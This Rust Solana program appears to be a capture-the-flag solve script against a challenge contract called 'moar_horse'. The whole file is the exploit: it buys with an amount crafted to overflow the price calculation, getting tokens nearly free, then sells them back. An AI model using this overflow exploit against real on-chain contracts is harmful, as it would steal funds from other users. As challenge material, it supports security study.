use borsh::BorshSerialize;

use solana_program::{
  account_info::{
    next_account_info,
    AccountInfo,
  },
  entrypoint::ProgramResult,
  instruction::{
    AccountMeta,
    Instruction,
  },
  program::invoke,
  pubkey::Pubkey,
  system_program,
};

use moar_horse::HorseInstruction;

pub fn process_instruction(_program: &Pubkey, accounts: &[AccountInfo], _data: &[u8]) -> ProgramResult {
  let account_iter = &mut accounts.iter();
  let moarhorse = next_account_info(account_iter)?;
  let user = next_account_info(account_iter)?;
  let horse = next_account_info(account_iter)?;
  let wallet = next_account_info(account_iter)?;

  let amount = (u64::MAX / 1000) + 1;

  invoke(
    &Instruction {
      program_id: *moarhorse.key,
      accounts: vec![
        AccountMeta::new(*horse.key, false),
        AccountMeta::new(*wallet.key, false),
        AccountMeta::new(*user.key, true),
        AccountMeta::new_readonly(system_program::id(), false),
      ],
      data: HorseInstruction::Buy { amount }.try_to_vec().unwrap(),
    },
    &[horse.clone(), wallet.clone(), user.clone()],
  )?;

  invoke(
    &Instruction {
      program_id: *moarhorse.key,
      accounts: vec![
        AccountMeta::new(*horse.key, false),
        AccountMeta::new(*wallet.key, false),
        AccountMeta::new(*user.key, true),
        AccountMeta::new_readonly(system_program::id(), false),
      ],
      data: HorseInstruction::Sell { amount: 100 }.try_to_vec().unwrap(),
    },
    &[horse.clone(), wallet.clone(), user.clone()],
  )?;

  Ok(())
}
